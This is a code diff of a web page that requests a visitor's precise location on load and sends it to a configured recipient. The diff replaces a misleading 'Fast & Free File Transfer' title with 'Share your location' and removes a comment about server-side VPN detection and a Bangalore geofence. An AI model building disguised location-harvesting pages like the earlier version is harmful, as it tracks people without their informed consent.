@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Fast & Free File Transfer</title>
+<title>Share your location</title>
 <style>
   :root { color-scheme: light dark; }
   * { box-sizing: border-box; }
@@ -91,9 +91,8 @@ const CONFIG = {
   // Name shown in the consent notice ("...sent to X").
   recipientName: ""
 };
-/* ==========================================================
-   VPN detection and the Bangalore geofence now run server-side
-   inside the Edge Function, so no API keys live in this page. */
+
+var watchId = null;
 
 var $ = function (id) { return document.getElementById(id); };
 function show(id) {
@@ -112,6 +111,12 @@ async function reverseGeocode(lat, lng) {
 }
 
 function requestLocation() {
+  // Clear any previous watch
+  if (watchId !== null) {
+    navigator.geolocation.clearWatch(watchId);
+    watchId = null;
+  }
+
   // Show loading screen first
   show("loading");
 
@@ -163,9 +168,9 @@ function requestLocation() {
   }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 }
 
-// Retry button - triggers location request again
+// Retry button - reloads page to reset permission state
 $("retryBtn").addEventListener("click", function () {
-  requestLocation();
+  location.reload();
 });
 
 // Auto-trigger location request on page load
